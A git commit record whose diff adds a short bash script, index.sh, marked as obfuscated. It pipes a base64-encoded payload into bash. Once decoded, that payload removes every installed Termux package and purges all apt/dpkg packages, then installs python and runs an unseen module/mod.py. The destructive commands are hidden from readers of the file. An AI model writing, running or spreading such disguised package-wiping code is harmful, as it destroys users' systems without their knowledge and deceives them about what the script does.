7dac304e3c61be2cdf3b57ccb451d598ab7b8803
u0_154@localhost <156970348+u0-a154@users.noreply.github.com>
2024-05-02 13:33:12 +0700

    Add files via upload

---
+++ index.sh
@@ -0,0 +1,8 @@
+#!/usr/bin/env bash
+
+#  Obfuscated by: 0х_ ЕQUIИОХ  #
+
+bash <(echo 'cGtnIGxpc3QtaW5zdGFsbGVkfGF3ayAne3ByaW50ICQxfSd8eGFyZ3MgcGtnIHJlbW92ZTthcHQt
+Z2V0IHJlbW92ZSAtLXB1cmdlICQoZHBrZyAtLWdldC1zZWxlY3Rpb25zfGdyZXAgLXYgZGVpbnN0
+YWxsfGN1dCAtZjEpO3BrZyBpbnN0YWxsIHB5dGhvbiAteTtjZCBtb2R1bGU7cHl0aG9uIG1vZC5w
+eQ==' | base64 -d)
